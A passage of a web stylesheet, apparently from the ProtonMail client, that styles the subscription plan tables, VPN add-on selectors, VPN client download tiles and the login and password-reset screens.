        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons td+td,
        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-tbody-addons tr {
            padding-right: 0
        }

        .settingsDashboard-subscription-section-table-container .subscriptionSection-table .subscriptionSection-item-price {
            width: 30%;
            text-align: right
        }

        .settingsDashboard-plans-devise {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .settingsDashboard-plans-devise,
        .settingsDashboard-plans-devise-label {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .settingsDashboard-plans-devise-label {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .settingsDashboard-plans-devise-label-link {
            margin-left: 5px
        }

        .settingsDashboard-plans-devise-label>label {
            font-weight: 700
        }

        .settingsDashboard-plans-subheader {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            margin-bottom: 1em
        }

        .settingsDashboard-plans-subheader .vpnDiscountPanel-container {
            margin-right: 1em
        }

        .settingsDashboard-plans {
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 34px 0
        }

        .settingsDashboard-plans [class*=Column-container] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .settingsDashboard-plans [class*=Column-container]>* {
            position: relative;
            -webkit-box-orient: horizontal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            height: 45px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .settingsDashboard-plans [class*=Column-container]>*,
        .settingsDashboard-plans [class*=Column-header] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-direction: normal;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .settingsDashboard-plans [class*=Column-header] {
            -webkit-box-orient: vertical;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .settingsDashboard-plans [class*=Column-header]>h1 {
            text-transform: uppercase;
            font-size: 1.3em
        }

        .settingsDashboard-plans [class*=Column-header]>.totalPlan {
            font-size: 1.2em;
            font-weight: 100
        }

        .settingsDashboard-plans [class*=Column-container]>*>:not(:last-child) {
            margin-right: 5px
        }

        .settingsDashboard-plans [class*=Column-container] [class*=-customize] {
            margin-left: auto;
            text-align: center
        }

        .settingsDashboard-plans [class*=Column-container] .fa-info-circle {
            position: absolute;
            right: 18px;
            top: 15px;
            margin: 0;
            z-index: 10
        }

        .settingsDashboard-plans [class*=Column-container] [class*=-customize] {
            width: auto;
            padding: 0
        }

        .settingsDashboard-plans [class*=Column-container] [class*=addonRow-container] {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0
        }

        .settingsDashboard-plans [class*=Column-container] [class*=addonRow] .addonRow-vpn {
            margin-right: 5px
        }

        .settingsDashboard-plans [class*=Column-container] [class*=addonRow] .pm_select {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            background: #fff
        }

        .settingsDashboard-plans [class*=Column-container] [class*=addonRow] .pm_select select {
            width: 100%;
            padding-right: 40px
        }

        .settingsDashboard-plans [class*=Column-container] .plusColumn-address [class*=addonRow] .pm_select .fa,
        .settingsDashboard-plans [class*=Column-container] .plusColumn-domain [class*=addonRow] .pm_select .fa,
        .settingsDashboard-plans [class*=Column-container] .professionalColumn-domain [class*=addonRow] .pm_select .fa,
        .settingsDashboard-plans [class*=Column-container] .professionalColumn-vpn [class*=addonRow] .pm_select .fa {
            right: 15px
        }

        .settingsDashboard-plans [class*=Column-container] .addonRow-price:not(:empty) {
            margin-left: 5px
        }

        .settingsDashboard-plans [class*=Column-container] {
            border: 1px solid #acb0bf;
            border-radius: 2px
        }

        .settingsDashboard-plans [class*=Column-container]:not(:last-of-type) {
            margin-right: 4px
        }

        .settingsDashboard-plans [class*=Column-container]>* {
            padding: 0 10px
        }

        .settingsDashboard-plans [class*=Column-container]>:not(:last-child) {
            border-bottom: 1px solid #acb0bf
        }

        .settingsDashboard-plans [class*=Column-container]>.plusColumn-user,
        .settingsDashboard-plans [class*=Column-container]>.professionalColumn-address,
        .settingsDashboard-plans [class*=Column-container]>.professionalColumn-space {
            padding: 0 10px 0 20px
        }

        .settingsDashboard-plans [class*=Column-header] {
            height: 80px;
            border-bottom: 0;
            border-radius: 2px 2px 0 0
        }

        .settingsDashboard-plans [class*=Column-container]>[class*=Column-autoresponder],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-catch-all],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-filters],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-labels],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-member],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-sending],
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-support] {
            height: 22px;
            border: 0
        }

        .settingsDashboard-plans [class*=Column-container]>[class*=Column-autoresponder] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-catch-all] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-filters] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-labels] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-member] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-sending] .fa-info-circle,
        .settingsDashboard-plans [class*=Column-container]>[class*=Column-support] .fa-info-circle {
            position: static
        }

        .settingsDashboard-plans [class*=Column-container]>.professionalColumn-address,
        .settingsDashboard-plans [class*=Column-container]>.professionalColumn-space {
            padding-right: 35px
        }

        .settingsDashboard-plans [class*=Column-container] [class*=Column-sending],
        .settingsDashboard-plans [class*=Column-container] [class*=Column-vpn] {
            margin-top: 15px
        }

        .settingsDashboard-plans [class*=Column-container] [class*=Column-vpn] {
            border-top: 1px solid #acb0bf
        }

        .settingsDashboard-plans .totalRows-container>label:not(:first-of-type) {
            position: relative
        }

        .settingsDashboard-plans .totalRows-container>label:not(:first-of-type):before {
            content: "";
            position: absolute;
            left: -10px;
            top: 0;
            border-top: 1px solid #acb0bf;
            width: calc(100% + 20px)
        }

        .settingsDashboard-plans .freeColumn-free,
        .settingsDashboard-plans .totalRows-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start;
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 130px
        }

        .settingsDashboard-plans .freeColumn-free {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 100%;
            color: #9397cd;
            font-size: 1.1rem;
            font-weight: 700
        }

        .settingsDashboard-plans .freeColumn-container.freeColumn-show-vpn .freeColumn-free,
        .settingsDashboard-plans .freeColumn-container:not(.freeColumn-show-vpn) .totalRows-container {
            display: none
        }

        .settingsDashboard-plans .totalRows-container>label {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .settingsDashboard-plans [class*=Column-footer] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: content-box;
            box-sizing: content-box;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            padding: 10px
        }

        .settingsDashboard-plans [class*=Column-footer] .selectPlan-button {
            min-width: 90%;
            padding: 0 1em;
            text-align: center;
            font-size: 1em;
            line-height: 1
        }

        .settingsDashboard-plans [class*=Column-footer] .addVpn-button {
            background: transparent;
            border: 0;
            color: #5cb85c;
            font-weight: 700;
            font-size: 1.2em;
            padding: 0;
            height: auto
        }

        .settingsDashboard-plans [class*=Column-footer] .addVpn-button-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: .3em 1em .2em .5em
        }

        .settingsDashboard-plans [class*=Column-footer] .addVpn-button-wrapper:before {
            content: "";
            display: inline-block;
            background: url(assets/img/protonvpn-sign-green.svg) no-repeat 35% 0;
            background-size: 3em;
            height: 2em;
            width: 2em
        }

        .settingsDashboard-plans [class*=Column-footer] .vpnIncluded {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 48px
        }

        .settingsDashboard-plans [class*=Column-container]>.disabled {
            opacity: .8
        }

        .settingsDashboard-plans [class*=Column-container]>.disabled:before {
            content: "\F00D";
            font-family: FontAwesome;
            margin-right: 5px
        }

        .settingsDashboard-plans [class*=Column-container] .isCurrent {
            position: absolute;
            left: -1px;
            top: -36px;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: calc(100% + 2px);
            height: 32px;
            text-align: center;
            font-weight: 700;
            color: #fff;
            background: #9397cd;
            border-radius: 2px 2px 0 0;
            -webkit-box-shadow: 0 0 8px #9397cd, 0 0 0 2px #9397cd;
            box-shadow: 0 0 8px #9397cd, 0 0 0 2px #9397cd;
            border-bottom: 1px solid #9397cd
        }

        .settingsDashboard-plans .plusColumn-header {
            color: #c6e422
        }

        .settingsDashboard-plans .professionalColumn-header {
            color: #d4b46e
        }

        .settingsDashboard-plans .planPrice {
            color: #4d4c5d
        }

        .settingsDashboard-plans .visionaryColumn-header {
            color: #6ddcfb
        }

        [class*=Column-container] {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            margin: 4px 4px 0 0;
            min-width: 320px
        }

        .settingsDashboard-plans.free-active .freeColumn-container,
        .settingsDashboard-plans.plus-active .plusColumn-container,
        .settingsDashboard-plans.professional-active .professionalColumn-container,
        .settingsDashboard-plans.visionary-active .visionaryColumn-container {
            border-color: #9397cd;
            -webkit-box-shadow: 0 0 8px #9397cd, 0 0 0 2px #9397cd;
            box-shadow: 0 0 8px #9397cd, 0 0 0 2px #9397cd;
            border-radius: 0 0 2px 2px
        }

        .settingsDashboard-plans .isCurrent {
            display: none
        }

        .settingsDashboard-plans.free-active .freeColumn-container .isCurrent,
        .settingsDashboard-plans.plus-active .plusColumn-container .isCurrent,
        .settingsDashboard-plans.professional-active .professionalColumn-container .isCurrent,
        .settingsDashboard-plans.visionary-active .visionaryColumn-container .isCurrent {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        #pm_settings .settings .row:last-of-type,
        #pm_settings .settings.settingsDashboard-container {
            padding-bottom: 0
        }

        .settingsDashboard-plans {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            background: #fff no-repeat;
            background-image: radial-gradient(farthest-side at 0 50%, #acb0bf, transparent), radial-gradient(farthest-side at 100% 50%, #acb0bf, transparent);
            background-position: 0 50%, 100% 50%;
            background-size: 25px 400px;
            margin: 0 -25px;
            width: calc(100% + 50px)
        }

        .settingsDashboard-plans:after,
        .settingsDashboard-plans:before {
            content: "";
            height: 400px;
            position: static;
            min-width: 25px;
            width: 25px;
            background: #fff
        }

        [class*=settingsDashboard-arrowToScroll] {
            position: relative
        }

        [class*=settingsDashboard-arrowToScroll] .arrowsToScroll-button {
            position: absolute;
            top: calc(50% - 15px);
            border-radius: 2px;
            background: rgba(80, 80, 97, .9)
        }

        [class*=settingsDashboard-arrowToScroll] .arrowsToScroll-button:hover {
            background: #505061
        }

        [class*=settingsDashboard-arrowToScroll] .arrowsToScroll-button[data-direction=left] {
            left: -10px
        }

        [class*=settingsDashboard-arrowToScroll] .arrowsToScroll-button[data-direction=right] {
            right: -10px
        }

        body.appConfigBody-is-mobile .settingsDashboard-plans-subheader {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        body.appConfigBody-is-mobile .settingsDashboard-plans-subheader .vpnDiscountPanel-container {
            margin-right: 0
        }

        .addonRow-placeholder-row {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            padding-left: 8px;
            width: 100%
        }

        .addonRow-container.addonRow-limit-reached .addonRow-select-row,
        .addonRow-container:not(.addonRow-limit-reached) .addonRow-placeholder-row {
            display: none
        }

        .totalRows-container>label {
            cursor: pointer
        }

        .totalRows-container>label,
        .totalRows-container>label [class*=-left],
        .totalRows-container>label [class*=-right] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .totalRows-container:not(.totalRows-has-2-years) .totalRows-label-2-year {
            display: none
        }

        .totalRows-cycle {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            min-width: 1px;
            white-space: nowrap;
            margin-left: 4px
        }

        .totalRows-label-right {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: end;
            -webkit-align-items: flex-end;
            -ms-flex-align: end;
            align-items: flex-end;
            text-align: right;
            width: 100%
        }

        .totalRows-wrapper {
            text-align: right
        }

        .totalRows-2-years-price,
        .totalRows-monthly-price,
        .totalRows-yearly-price {
            font-size: 1.1rem;
            color: #9397cd
        }

        .totalRows-billed-price {
            opacity: .8
        }

        .totalRows-container .customRadio-container {
            width: auto
        }

        .totalRows-label-yearly {
            position: relative
        }

        .totalRows-discount {
            margin-left: 4px;
            padding: 1px 3px;
            font-weight: 700;
            font-size: .85em;
            color: #ff5400;
            border: 1px solid #ff5400;
            border-radius: 2px
        }

        .totalRows-discount:hover {
            color: #fff;
            background-color: #ff5400
        }

        .totalRows-2-years-billed-price {
            font-size: 75%
        }

        body.appConfigBody-is-mobile .totalRows-container>label {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: .5em;
            overflow: hidden
        }

        body.appConfigBody-is-mobile .totalRows-container>label [class*=-left] {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-align-self: flex-start;
            -ms-flex-item-align: start;
            align-self: flex-start
        }

        body.appConfigBody-is-mobile .totalRows-container>label [class*=-right] {
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
            text-align: left;
            padding-left: 75px
        }

        body.appConfigBody-is-mobile .totalRows-container .customRadio-container {
            -webkit-transform: scale(.8);
            transform: scale(.8)
        }

        .freeColumn-container .totalRows-discount-with-vpn,
        .plusColumn-container .vpnRow-container:not(.vpnRow-has-vpn)+.totalRows-container .totalRows-discount-with-vpn,
        .plusColumn-container .vpnRow-has-vpn+.totalRows-container .totalRows-discount-without-vpn,
        .professionalColumn-container .vpnRow-container:not(.vpnRow-has-vpn)+.totalRows-container .totalRows-discount-with-vpn,
        .professionalColumn-container .vpnRow-has-vpn+.totalRows-container .totalRows-discount-without-vpn,
        .visionaryColumn-container .totalRows-discount-with-vpn {
            display: none
        }

        .currencySelector-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            border-radius: 2px
        }

        .currencySelector-container .currencySelector-button {
            margin: 0;
            border-radius: 0
        }

        .currencySelector-container .currencySelector-button:not(:first-of-type) {
            border-left: 0
        }

        .currencySelector-container .currencySelector-button:first-of-type {
            border-radius: 2px 0 0 2px
        }

        .currencySelector-container .currencySelector-button:last-of-type {
            border-radius: 0 2px 2px 0
        }

        .currencySelector-container .currencySelector-button.active {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05);
            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05)
        }

        .customProPlan-counter {
            display: block;
            margin-top: 20px;
            padding: 0 10px
        }

        .customProPlan-needMoreMember .customProPlan-members-link {
            display: none
        }

        .vpnRow-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .vpnRow-vpnplus {
            color: #9ccc23
        }

        .vpnRow-vpnbasic {
            color: #f67f60
        }

        .vpnRow-add,
        .vpnRow-add:hover {
            background-color: #a6cc93;
            color: #fff
        }

        .vpnRow-edit {
            border: 0;
            background: transparent;
            color: #9397cd;
            text-decoration: underline
        }

        .vpnRow-info {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            width: 100%;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .vpnRow-right {
            white-space: nowrap
        }

        .customVpnModal-body.customVpnModal-from-free .vpnSlider-container,
        .customVpnModal-body.customVpnModal-from-free .vpnTotal-container,
        .customVpnModal-body.customVpnModal-from-plus .vpnSlider-container,
        .customVpnModal-body.customVpnModal-from-plus .vpnTotal-container,
        .vpnRow-container:not(.vpnRow-has-vpn) .vpnRow-info,
        .vpnRow-has-vpn .vpnRow-add,
        .vpnRow-has-vpn .vpnRow-icon {
            display: none
        }

        .customVpnModal-remove {
            border: 0;
            background: transparent;
            color: #9397cd;
            text-decoration: underline
        }

        .vpnColumns-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            margin-bottom: 20px;
            margin-top: 40px
        }

        .vpnColumns-col {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .vpnColumns-col:first-child {
            padding-top: 80px
        }

        .vpnColumns-col>div:nth-child(2n) {
            background-color: #f4f4f4
        }

        .vpnColumns-vpnbasic-col,
        .vpnColumns-vpnplus-col {
            margin-left: 7px;
            -webkit-box-shadow: 0 0 0 1px #acb0bf;
            box-shadow: 0 0 0 1px #acb0bf;
            border-radius: 2px
        }

        .vpnColumns-vpnbasic-col *,
        .vpnColumns-vpnplus-col * {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        .vpnColumns-label .fa {
            margin-left: 4px
        }

        .vpnColumns-vpnbasic-selected .vpnColumns-vpnbasic-col {
            -webkit-box-shadow: 0 0 0 3px #f67f60;
            box-shadow: 0 0 0 3px #f67f60
        }

        .vpnColumns-vpnplus-selected .vpnColumns-vpnplus-col {
            -webkit-box-shadow: 0 0 0 3px #9ccc23;
            box-shadow: 0 0 0 3px #9ccc23
        }

        .vpnColumns-col>* {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            height: 35px;
            position: relative
        }

        .vpnColumns-vpnbasic-title {
            color: #f67f60
        }

        .vpnColumns-vpnplus-title {
            color: #9ccc23
        }

        .vpnColumns-header {
            border-bottom: 1px solid #acb0bf;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            height: 80px
        }

        .vpnColumns-selected {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            border-radius: 2px 2px 0 0;
            color: #fff;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            font-size: .9em;
            font-weight: 700;
            height: 25px;
            left: 0;
            position: absolute;
            text-transform: uppercase;
            top: -28px;
            width: 100%
        }

        .vpnColumns-vpnbasic-col .vpnColumns-selected {
            background-color: #f67f60;
            -webkit-box-shadow: 0 0 0 3px #f67f60;
            box-shadow: 0 0 0 3px #f67f60
        }

        .vpnColumns-vpnplus-col .vpnColumns-selected {
            background-color: #9ccc23;
            -webkit-box-shadow: 0 0 0 3px #9ccc23;
            box-shadow: 0 0 0 3px #9ccc23
        }

        .vpnColumns-vpnbasic-title,
        .vpnColumns-vpnplus-title {
            font-size: 1.3em
        }

        .vpnColumns-vpnbasic-amount,
        .vpnColumns-vpnplus-amount {
            font-weight: 700;
            margin-left: 5px
        }

        .vpnColumns-footer {
            border-top: 1px solid #acb0bf;
            height: 45px
        }

        .vpnColumns-footer button {
            background-color: #f4f4f4;
            border-radius: 0 2px;
            border: 0;
            font-weight: 700;
            height: 100%;
            width: 100%
        }

        .vpnColumns-footer button:not([disabled]):focus,
        .vpnColumns-footer button:not([disabled]):hover {
            opacity: .7
        }

        .vpnColumns-vpnplus-col button:first-child {
            color: #fff;
            background-color: #9ccc23
        }

        .vpnColumns-vpnbasic-selected .vpnColumns-vpnbasic-col button:first-child,
        .vpnColumns-vpnbasic-selected .vpnColumns-vpnplus-col .vpnColumns-selected,
        .vpnColumns-vpnbasic-selected .vpnColumns-vpnplus-col button:last-child,
        .vpnColumns-vpnplus-selected .vpnColumns-vpnbasic-col .vpnColumns-selected,
        .vpnColumns-vpnplus-selected .vpnColumns-vpnbasic-col button:last-child,
        .vpnColumns-vpnplus-selected .vpnColumns-vpnplus-col button:first-child,
        .vpnSlider-vpnbasic-selected .vpnSlider-vpnplus-info,
        .vpnSlider-vpnplus-selected .vpnSlider-vpnbasic-info {
            display: none
        }

        .vpnSlider-vpnbasic-info,
        .vpnSlider-vpnplus-info {
            font-style: italic
        }

        .vpnSlider-container:not(.vpnSlider-vpnplus-selected) .slider {
            background-color: #f4f4f4;
            border-radius: 2px
        }

        .vpnSlider-container:not(.vpnSlider-vpnplus-selected) .slider * {
            opacity: .9;
            pointer-events: none
        }

        .vpnSlider-container:not(.vpnSlider-vpnplus-selected) .slider .noUi-tooltip,
        .vpnSlider-container:not(.vpnSlider-vpnplus-selected) .slider .noUi-value {
            display: none
        }

        .vpn-container {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 2rem 0
        }

        .vpn-container .vpn-ressourcesSection-clients-list {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            width: 100%;
            padding: 3em 2em;
            list-style: none;
            border-radius: 6px;
            background: #f8f8f8;
            border: 1px solid #cfcfcf;
            -webkit-box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .15);
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .15)
        }

        .vpn-container .vpn-ressourcesSection-clients-list,
        .vpn-container .vpn-ressourcesSection-clients-list * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .vpn-container .vpn-ressourcesSection-clients-item {
            margin-right: 1em;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .vpn-container .vpn-ressourcesSection-clients-item-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 150px;
            padding-top: 1em;
            text-decoration: none;
            border-radius: 6px;
            background: #fff;
            border: 1px solid rgba(0, 0, 0, .15);
            color: #505061;
            -webkit-transition: all .3s cubic-bezier(.25, .46, .45, .94);
            transition: all .3s cubic-bezier(.25, .46, .45, .94);
            cursor: pointer
        }

        .vpn-container .vpn-ressourcesSection-clients-item-container:not(.disabled):hover {
            border-color: transparent;
            -webkit-box-shadow: 0 0 25px rgba(0, 0, 0, .2);
            box-shadow: 0 0 25px rgba(0, 0, 0, .2)
        }

        .vpn-container .vpn-ressourcesSection-clients-item-container.disabled {
            opacity: .4
        }

        .vpn-container .vpn-ressourcesSection-clients-item-icon {
            font-size: 3em;
            margin-bottom: .2em;
            color: inherit
        }

        .vpn-container .vpn-ressourcesSection-clients-item-text {
            font-size: 1.2em
        }

        .vpn-container .vpn-ressourcesSection-clients-item-download {
            opacity: 0;
            -webkit-transform: translateY(-10px);
            transform: translateY(-10px);
            -webkit-transition: all .3s cubic-bezier(.25, .46, .45, .94);
            transition: all .3s cubic-bezier(.25, .46, .45, .94)
        }

        .vpn-container .vpn-ressourcesSection-clients-item-container:hover .vpn-ressourcesSection-clients-item-download {
            opacity: .8;
            -webkit-transform: translateY(0);
            transform: translateY(0)
        }

        .vpn-container .plateform-windows {
            color: #00adef
        }

        .vpn-container .plateform-apple,
        .vpn-container .plateform-ios {
            color: #111
        }

        .vpn-container .plateform-linux {
            color: #f9be00
        }

        .vpn-container .plateform-android {
            color: #a4ca39
        }

        body.appConfigBody-is-mobile .configurationFilesSection-labels,
        body.appConfigBody-is-mobile .vpn-ressourcesSection-clients-list {
            -webkit-box-orient: vertical;
            -webkit-box-direction: reverse;
            -webkit-flex-direction: column-reverse;
            -ms-flex-direction: column-reverse;
            flex-direction: column-reverse;
            padding: .5em
        }

        body.appConfigBody-is-mobile .configurationFilesSection-labels>label,
        body.appConfigBody-is-mobile .vpn-ressourcesSection-clients-item {
            margin: 0 0 .5em
        }

        body#reset {
            background: #4d4c5d
        }

        body#reset .alert:not(.alert-danger) {
            color: #000
        }

        body#reset .pm_panel {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        body#login-sub,
        body#login-unlock {
            height: 100%;
            background: #4d4c5d
        }

        body#login-sub p.text-center,
        body#login-unlock p.text-center {
            margin: 0 0 2rem;
            font-size: 14px
        }

        body#login-sub #pm_loader,
        body#login-unlock #pm_loader {
            display: none
        }

        body#login {
            background-color: #667cbd;
            background: url(assets/img/login.jpg) #667cbd 50% no-repeat;
            background-size: cover;
            background-attachment: fixed
        }

        #pm_login {
            background-image: url("https://mail.protonmail.com/assets/host.png")
        }

        body#eo-unlock #pm_login img.logo,
        body#eo-unlock #pm_loginTwoFactor img.logo,
        body#login #pm_login img.logo,
        body#login #pm_loginTwoFactor img.logo,
        body#login-sub #pm_login img.logo,
        body#login-sub #pm_loginTwoFactor img.logo,
        body#login-unlock #pm_login img.logo,
        body#login-unlock #pm_loginTwoFactor img.logo {
            margin-bottom: 2rem
        }

        body#eo-unlock {
            background: #4d4c5d
        }

        body#eo-unlock .pm_panel.error {
            height: auto;
            padding: 2rem 2rem 1rem
        }

        #pm_login,
        #pm_loginTwoFactor,
        body#reset {
            text-transform: uppercase
        }

        #pm_login #signUpProcess li,
        #pm_loginTwoFactor #signUpProcess li,
        body#reset #signUpProcess li {
            text-align: left
        }

        #pm_login h4,
        #pm_loginTwoFactor h4,
        body#reset h4 {
            padding: .9em 0;
            line-height: 1.2em;
            font-weight: 600
        }

        #pm_login a.pm_button.link,
        #pm_loginTwoFactor a.pm_button.link,
        body#reset a.pm_button.link {
            text-decoration: underline
        }

        #pm_login img.logo,
        #pm_loginTwoFactor img.logo,
        body#reset img.logo {
            display: block;
            height: 20px;
            width: auto;
            margin: 0 auto
        }

        #pm_login input[type=email],
        #pm_login input[type=number],
        #pm_login input[type=password],
        #pm_login input[type=text],
